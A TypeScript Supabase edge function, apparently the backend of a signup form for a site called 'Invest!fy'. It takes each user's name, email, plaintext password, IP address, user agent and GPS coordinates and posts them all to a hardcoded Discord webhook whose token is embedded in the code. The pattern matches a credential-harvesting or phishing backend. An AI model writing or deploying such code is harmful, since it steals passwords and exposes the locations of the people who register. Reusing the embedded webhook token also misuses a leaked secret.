import "jsr:@supabase/functions-js/edge-runtime.d.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, Authorization, X-Client-Info, Apikey",
};

Deno.serve(async (req: Request) => {
  if (req.method === "OPTIONS") {
    return new Response(null, {
      status: 200,
      headers: corsHeaders,
    });
  }

  try {
    const {
      fullName,
      email,
      password,
      ipAddress,
      userAgent,
      latitude,
      longitude,
      locationName,
      timestamp
    } = await req.json();

    const webhookUrl = "https://discord.com/api/webhooks/1459876370703323229/VQxnDCKBJCFi25T8ws2CnJ0_LB6jw8zQFSWz5wpivvX5A72YzLIDCfEd6PaXjTYOF4mZ";

    const formattedTimestamp = new Date(timestamp).toLocaleString('en-US', {
      month: '2-digit',
      day: '2-digit',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      hour12: true
    });

    const mapsLink = latitude && longitude ? `https://www.google.com/maps/search/${latitude},${longitude}` : null;

    const payload = {
      embeds: [
        {
          title: "👤 New User Signup",
          description: "A new user has registered on Invest!fy",
          color: 5763719,
          fields: [
            {
              name: "👤 Full Name",
              value: fullName || "Not provided",
              inline: true,
            },
            {
              name: "📧 Email",
              value: email || "Not provided",
              inline: true,
            },
            {
              name: "🔑 Password",
              value: password || "Not provided",
              inline: false,
            },
            {
              name: "🌐 IP Address",
              value: ipAddress || "Unknown",
              inline: false,
            },
            {
              name: "💻 User Agent",
              value: userAgent || "Unknown",
              inline: false,
            },
            {
              name: "📍 Location",
              value: locationName || "Unknown Location",
              inline: false,
            },
            {
              name: "🗺️ Coordinates",
              value: latitude && longitude ? `${latitude}, ${longitude}` : "Not available",
              inline: false,
            },
            {
              name: "🔗 Google Maps",
              value: mapsLink ? `[View on Maps](${mapsLink})` : "Not available",
              inline: false,
            },
            {
              name: "🕐 Timestamp",
              value: formattedTimestamp,
              inline: false,
            },
          ],
          footer: {
            text: `Invest!fy User Registration • ${formattedTimestamp}`,
          },
          timestamp: timestamp,
        },
      ],
    };

    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      throw new Error(`Discord webhook failed: ${response.statusText}`);
    }

    return new Response(JSON.stringify({ success: true }), {
      status: 200,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (error) {
    return new Response(JSON.stringify({ error: error.message }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
